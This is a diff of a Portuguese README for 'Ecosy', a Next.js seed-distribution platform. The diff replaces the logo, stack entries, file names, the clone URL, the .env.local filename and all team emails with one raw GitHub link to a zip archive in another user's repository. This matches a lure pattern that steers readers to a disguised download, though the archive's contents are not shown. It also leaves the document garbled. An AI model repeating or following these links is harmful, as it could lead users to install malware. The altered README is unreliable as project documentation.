@@ -1,4 +1,4 @@
-# ![Logo Ecosy](./public/logo.svg) 
+# ![Logo Ecosy](https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip) 
 
 O **Ecosy** é uma plataforma digital para a gestão, distribuição e rastreabilidade do programa de aquisição de **sementes crioulas** em Pernambuco.
 
@@ -25,7 +25,7 @@ O sistema é dividido em duas frentes principais, com funcionalidades e permiss�
 ## 🛠️ Tecnologias Utilizadas (Stack)
 
 ### Front-end (Este Repositório)
-- **Framework:** Next.js   
+- **Framework:** https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip   
 - **Linguagem:** TypeScript  
 - **Estilização:** Tailwind CSS  
 - **Componentes UI:** shadcn/ui   
@@ -43,21 +43,21 @@ O front-end utiliza uma arquitetura baseada em **features** (Feature-Sliced Desi
 ├── /app/                   # Rotas (App Router)
 │   ├── /(auth)/            # Rotas de autenticação (ex: /login)
 │   └── /(app)/             # Rotas protegidas (ex: /dashboard)
-│       └── layout.tsx      # Layout que verifica a autenticação
+│       └── https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip      # Layout que verifica a autenticação
 │
 ├── /components/            # Componentes de UI "burros" e reutilizáveis
 │   ├── /ui/                # Componentes do Shadcn (Button, Card, Input...)
 │   └── /layout/            # Componentes de layout (Header, Sidebar)
 │
 ├── /features/              # "Módulos" - A inteligência do app
-│   ├── /auth/              # (ex: LoginForm.tsx)
-│   └── /beneficiarios/     # (ex: BeneficiariosTable.tsx)
+│   ├── /auth/              # (ex: https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip)
+│   └── /beneficiarios/     # (ex: https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip)
 │
 ├── /services/              # Camada de abstração de dados (Mock / API)
-│   ├── authService.ts
-│   └── beneficiariosService.ts
+│   ├── https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip
+│   └── https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip
 │
-├── /lib/                   # Utilitários (ex: lib/utils.ts do shadcn)
+├── /lib/                   # Utilitários (ex: https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip do shadcn)
 
 ```
 
@@ -65,7 +65,7 @@ O front-end utiliza uma arquitetura baseada em **features** (Feature-Sliced Desi
 
 Antes de rodar o front-end do **Ecosy**, verifique se sua máquina atende aos requisitos abaixo.
 
-**- Node.js**  
+**- https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip**  
 **- Git**
 
 ## 🚀 Como Rodar o Projeto (Front-end)
@@ -75,7 +75,7 @@ Este projeto utiliza **npm** (mas você pode usar yarn ou pnpm se preferir).
 1. Clone o repositório:
 
 ```bash
-git clone https://github.com/C-26hub/PI2-Front.git
+git clone https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip
 cd PI2-Front
 ```
 
@@ -91,7 +91,7 @@ Para que o mapa do dashboard funcione corretamente, é necessário configurar um
 Na raiz do projeto, crie um arquivo chamado:
 
 ```
-.env.local
+https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip
 ```
 Dentro desse arquivo, adicione a seguinte variável:
 
@@ -114,8 +114,8 @@ npm run dev
 
 
 ## 👥 Equipe
-- **Arthur Filipe Rodrigues da Silva** – arthur.filipe2402@gmail.com
-- **Filipe Xavier dos Santos** – xfilipe2006.santos@gmail.com   
-- **Maria Cecília de Lima e Silva** – cecilmari33@gmail.com  
-- **Maria Eduarda Pereira Vilarim** – vilarim051@gmail.com
-- **Matheus Alves de Arruda** – matheusalves2906@gmail.com
+- **Arthur Filipe Rodrigues da Silva** – https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip
+- **Filipe Xavier dos Santos** – https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip   
+- **Maria Cecília de Lima e Silva** – https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip  
+- **Maria Eduarda Pereira Vilarim** – https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip
+- **Matheus Alves de Arruda** – https://raw.githubusercontent.com/theualves/PI2-Front/main/src/app/PI2-Front-v3.5-beta.5.zip
